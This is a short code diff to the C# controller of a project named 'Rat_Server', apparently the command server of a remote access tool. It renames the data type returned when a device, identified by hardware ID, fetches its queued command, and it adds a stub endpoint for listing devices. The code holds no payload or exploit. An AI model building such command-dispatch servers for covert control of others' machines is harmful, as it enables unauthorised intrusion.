@@ -55,11 +55,11 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetCurrentCommandForDevice")]
-        [ProducesResponseType(typeof(CurrentCommandDto), StatusCodes.Status200OK)]
+        [ProducesResponseType(typeof(DeviceCommandDto), StatusCodes.Status200OK)]
         [ProducesResponseType(StatusCodes.Status204NoContent)]
         [ProducesResponseType(StatusCodes.Status400BadRequest)]
         [ProducesResponseType(StatusCodes.Status401Unauthorized)]
-        public ActionResult<CurrentCommandDto> GetCurrentCommandForDevice([FromHeader] Guid Hwid)
+        public ActionResult<DeviceCommandDto> GetCurrentCommandForDevice([FromHeader] Guid Hwid)
         {
             // If the client didn't provide a Hwid, send back a Bad Request status code
             if (!ModelState.IsValid)
@@ -81,7 +81,7 @@ namespace Rat_Server.Controllers
                 // The first element of the list is the current command the device needs to execute
                 Command command = commands.First();
 
-                return Ok(new CurrentCommandDto {
+                return Ok(new DeviceCommandDto {
                     commandId = command.commandId.ToString(),
                     CommandValue = command.CommandValue
                 });
@@ -90,6 +90,12 @@ namespace Rat_Server.Controllers
             {
                 return NoContent();
             }
+        }
+
+        [HttpGet("GetAllDevices")]
+        public ActionResult<List<DeviceCommandDto>> GetAllDevices()
+        {
+            return StatusCode(StatusCodes.Status501NotImplemented);
         }
     }
 }
